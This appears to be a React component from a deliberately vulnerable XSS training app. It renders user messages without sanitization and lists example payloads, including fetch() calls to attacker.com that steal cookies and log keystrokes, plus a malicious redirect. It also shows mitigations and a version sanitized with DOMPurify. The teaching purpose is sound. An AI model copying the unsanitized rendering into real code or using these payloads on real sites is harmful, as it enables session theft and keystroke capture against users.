import React, { useState, useEffect } from 'react';
import axios from 'axios';
import DOMPurify from 'dompurify';

function XSS() {
  const [message, setMessage] = useState('');
  const [messages, setMessages] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    loadMessages();
  }, []);

  const loadMessages = async () => {
    try {
      const response = await axios.get('/api/messages');
      setMessages(response.data);
    } catch (err) {
      console.error('Failed to load messages:', err);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      await axios.post('/api/messages', { content: message });
      setMessage('');
      await loadMessages(); // Reload messages
    } catch (err) {
      setError(err.response?.data?.error || 'Failed to post message');
    } finally {
      setLoading(false);
    }
  };

  const examplePayloads = [
    {
      name: 'Basic XSS Alert',
      payload: "<script>alert('XSS')</script>",
      description: 'Basic script injection'
    },
    {
      name: 'Image XSS',
      payload: "<img src='x' onerror='alert(\"XSS\")'>",
      description: 'XSS using image onerror event'
    },
    {
      name: 'Steal Cookies',
      payload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
      description: 'Steal user cookies (simulated)'
    },
    {
      name: 'Keylogger',
      payload: "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>",
      description: 'Keylogger simulation'
    },
    {
      name: 'Redirect',
      payload: "<script>window.location='http://malicious-site.com'</script>",
      description: 'Redirect user to malicious site'
    }
  ];

  const clearMessages = async () => {
    try {
      // This would require a proper endpoint to clear messages
      // For now, we'll just reload the page
      window.location.reload();
    } catch (err) {
      console.error('Failed to clear messages:', err);
    }
  };

  return (
    <div className="component">
      <h2>Cross-Site Scripting (XSS)</h2>
      
      <div className="vulnerability-info">
        <h4>XSS Vulnerability</h4>
        <p>
          This message board is vulnerable to Cross-Site Scripting attacks due to lack of input sanitization and output encoding.
        </p>
        <ul>
          <li>Vulnerable endpoint: <code>/api/messages</code></li>
          <li>No input sanitization on server side</li>
          <li>No output encoding on client side</li>
          <li>Stored XSS vulnerability</li>
        </ul>
      </div>

      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="message">Post a Message:</label>
          <textarea
            id="message"
            value={message}
            onChange={(e) => setMessage(e.target.value)}
            placeholder="Enter your message or XSS payload"
            rows="4"
          />
        </div>

        <button type="submit" className="btn" disabled={loading}>
          {loading ? 'Posting...' : 'Post Message'}
        </button>
        
        <button 
          type="button" 
          className="btn btn-danger" 
          onClick={clearMessages}
          style={{ marginLeft: '10px' }}
        >
          Clear Messages
        </button>
      </form>

      {error && <div className="error">{error}</div>}

      <div className="message-board" style={{ marginTop: '30px' }}>
        <h4>Message Board:</h4>
        <div className="message-list">
          {messages.length === 0 ? (
            <p>No messages yet. Be the first to post!</p>
          ) : (
            messages.map((msg) => (
              <div key={msg.id} className="message">
                <div className="message-header">
                  {msg.username || 'Anonymous'} - {new Date(msg.created_at).toLocaleString()}
                </div>
                <div 
                  className="message-content"
                  dangerouslySetInnerHTML={{ __html: msg.content }}
                />
              </div>
            ))
          )}
        </div>
      </div>

      <div className="example-payloads" style={{ marginTop: '30px' }}>
        <h4>Example XSS Payloads:</h4>
        <div className="vulnerability-list">
          {examplePayloads.map((example, index) => (
            <div key={index} className="vulnerability-card">
              <h5>{example.name}</h5>
              <code>{example.payload}</code>
              <p>{example.description}</p>
              <button
                className="btn"
                onClick={() => {
                  setMessage(example.payload);
                  document.getElementById('message').focus();
                }}
                style={{ marginTop: '10px' }}
              >
                Use This Payload
              </button>
            </div>
          ))}
        </div>
      </div>

      <div className="mitigation-info" style={{ marginTop: '30px' }}>
        <h4>Mitigation Strategies:</h4>
        <ul>
          <li>Implement input validation and sanitization</li>
          <li>Use output encoding when displaying user content</li>
          <li>Implement Content Security Policy (CSP)</li>
          <li>Use libraries like DOMPurify to sanitize HTML</li>
          <li>Set HttpOnly flag on cookies</li>
          <li>Use modern frameworks with built-in XSS protection</li>
        </ul>
      </div>

      <div className="secure-example" style={{ marginTop: '30px' }}>
        <h4>Secure Alternative (using DOMPurify):</h4>
        <p>Here's how the same messages would look with proper sanitization:</p>
        <div className="message-list">
          {messages.length === 0 ? (
            <p>No messages yet.</p>
          ) : (
            messages.map((msg) => (
              <div key={msg.id} className="message">
                <div className="message-header">
                  {msg.username || 'Anonymous'} - {new Date(msg.created_at).toLocaleString()}
                </div>
                <div 
                  className="message-content"
                  dangerouslySetInnerHTML={{ 
                    __html: DOMPurify.sanitize(msg.content) 
                  }}
                />
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
}

export default XSS;
